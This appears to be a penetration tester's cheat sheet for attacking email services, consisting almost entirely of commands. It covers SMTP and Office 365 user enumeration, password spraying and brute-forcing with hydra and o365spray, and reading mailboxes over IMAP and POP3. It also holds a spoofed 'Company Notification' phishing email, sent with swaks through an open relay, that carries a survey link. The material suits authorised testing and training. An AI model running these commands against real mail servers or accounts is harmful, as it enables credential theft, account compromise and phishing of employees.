###### Enumeration
```
host -t MX <FQDN>
dig mx <FQDN> | grep "MX" | grep -v ";"
host -t A mail1.<FQDN>
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <IP>
```
###### Authentication
```
telnet <IP> 25
```
###### Username validation
```
VRFY root
EXPB root
EXPN support-team 
RCPT TO:julio
USER julio

smtp-user-enum -M RCPT -U <USER_LIST> -D <DOMAIN> -t <IP>
```
###### Cloud Enumeration
```
python3 o365spray.py --validate --domain <DOMAIN>
python3 o365spray.py --enum -U <USER_LIST> --domain <DOMAIN>
```
###### Password Attacks
```
hydra -L <USER_LIST> -p '<PASS>' -f <IP> pop3
hydra -l <USER>@<DOMAIN> -P <WORDLIST> smtp://<IP> -f
python3 o365spray.py --spray -U <USER_LIST> -p '<PASS>' --count 1 --lockout 1 --domain <DOMAIN>
```
###### Open Relay (SMTP)
```
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
swaks --from notifications@<DOMAIN> --to employees@<DOMAIN> --header 'Subject: Company Notification' --body 'Please complete the following survey. http://<CUSTOM_URL>/' --server <SERVER_IP>
		EHLO parrot
		MAIL FROM:<notifications@<DOMAIN>>
		RCPT TO:<employees@<DOMAIN>>
		DATA
		Date: Thu, 29 Oct 2020 01:36:06 -0400
		To: employees@<DOMAIN>
		From: notifications@<DOMAIN
		Subject: Company Notification
		Message-Id: <20201029013606.775675@parrot>
		X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
		Hi All, we want to hear from you! Please complete the following survey. http://<CUSTOM_URL>.com
```
###### POP3 Enumeration/Login
```
curl -k 'imaps://<IP>' --user <USER>:<PASS> -v
	openssl s_client -connect <IP>:pop3s
	openssl s_client -connect <IP>:imaps
		tag1 login robin robin
		tag2 LIST "" "*"
		tag3 SELECT "DEV.DEPARTMENT.INT"
		tag4 FETCH 1 (BODY[])
```